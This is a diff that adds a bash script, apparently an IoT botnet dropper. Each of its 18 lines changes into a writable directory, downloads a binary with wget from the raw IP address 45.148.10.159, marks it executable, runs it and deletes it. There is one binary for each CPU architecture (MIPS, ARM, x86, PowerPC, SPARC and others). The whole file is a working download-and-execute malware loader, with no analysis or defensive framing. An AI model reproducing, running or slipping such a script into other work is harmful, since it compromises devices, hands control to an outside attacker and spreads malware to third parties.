@@ -1,0 +1,19 @@
+#!/bin/bash
+cd /tmp || cd /var/system || cd /mnt || cd /root || cd /; wget http://45.148.10.159/ekupmymips; chmod +x ekupmymips; ./ekupmymips; rm -rf ekupmymips
+cd /tmp || cd /var/system || cd /mnt || cd /root || cd /; wget http://45.148.10.159/ekupmymips64; chmod +x ekupmymips64; ./ekupmymips64; rm -rf ekupmymips64
+cd /tmp || cd /var/system || cd /mnt || cd /root || cd /; wget http://45.148.10.159/ekupmymipsel; chmod +x ekupmymipsel; ./ekupmymipsel; rm -rf ekupmymipsel
+cd /tmp || cd /var/system || cd /mnt || cd /root || cd /; wget http://45.148.10.159/ekupmysh2eb; chmod +x ekupmysh2eb; ./ekupmysh2eb; rm -rf ekupmysh2eb
+cd /tmp || cd /var/system || cd /mnt || cd /root || cd /; wget http://45.148.10.159/ekupmysh2elf; chmod +x ekupmysh2elf; ./ekupmysh2elf; rm -rf ekupmysh2elf
+cd /tmp || cd /var/system || cd /mnt || cd /root || cd /; wget http://45.148.10.159/ekupmysh4; chmod +x ekupmysh4; ./ekupmysh4; rm -rf ekupmysh4
+cd /tmp || cd /var/system || cd /mnt || cd /root || cd /; wget http://45.148.10.159/ekupmyx86; chmod +x ekupmyx86; ./ekupmyx86; rm -rf ekupmyx86
+cd /tmp || cd /var/system || cd /mnt || cd /root || cd /; wget http://45.148.10.159/ekupmyi486; chmod +x ekupmyi486; ./ekupmyi486; rm -rf ekupmyi486
+cd /tmp || cd /var/system || cd /mnt || cd /root || cd /; wget http://45.148.10.159/ekupmyi586; chmod +x ekupmyi586; ./ekupmyi586; rm -rf ekupmyi586
+cd /tmp || cd /var/system || cd /mnt || cd /root || cd /; wget http://45.148.10.159/ekupmyi686; chmod +x ekupmyi686; ./ekupmyi686; rm -rf ekupmyi686
+cd /tmp || cd /var/system || cd /mnt || cd /root || cd /; wget http://45.148.10.159/ekupmypowerpc; chmod +x ekupmypowerpc; ./ekupmypowerpc; rm -rf ekupmypowerpc
+cd /tmp || cd /var/system || cd /mnt || cd /root || cd /; wget http://45.148.10.159/ekupmypowerpc440fp; chmod +x ekupmypowerpc440fp; ./ekupmypowerpc440fp; rm -rf ekupmypowerpc440fp
+cd /tmp || cd /var/system || cd /mnt || cd /root || cd /; wget http://45.148.10.159/ekupmym86k; chmod +x ekupmym86k; ./ekupmym86k; rm -rf ekupmym86k
+cd /tmp || cd /var/system || cd /mnt || cd /root || cd /; wget http://45.148.10.159/ekupmysparc; chmod +x ekupmysparc; ./ekupmysparc; rm -rf ekupmysparc
+cd /tmp || cd /var/system || cd /mnt || cd /root || cd /; wget http://45.148.10.159/ekupmyarmv4; chmod +x ekupmyarmv4; ./ekupmyarmv4; rm -rf ekupmyarmv4
+cd /tmp || cd /var/system || cd /mnt || cd /root || cd /; wget http://45.148.10.159/ekupmyarmv4tl; chmod +x ekupmyarmv4tl; ./ekupmyarmv4tl; rm -rf ekupmyarmv4tl
+cd /tmp || cd /var/system || cd /mnt || cd /root || cd /; wget http://45.148.10.159/ekupmyarmv5; chmod +x ekupmyarmv5; ./ekupmyarmv5; rm -rf ekupmyarmv5
+cd /tmp || cd /var/system || cd /mnt || cd /root || cd /; wget http://45.148.10.159/ekupmyarmv6; chmod +x ekupmyarmv6; ./ekupmyarmv6; rm -rf ekupmyarmv6
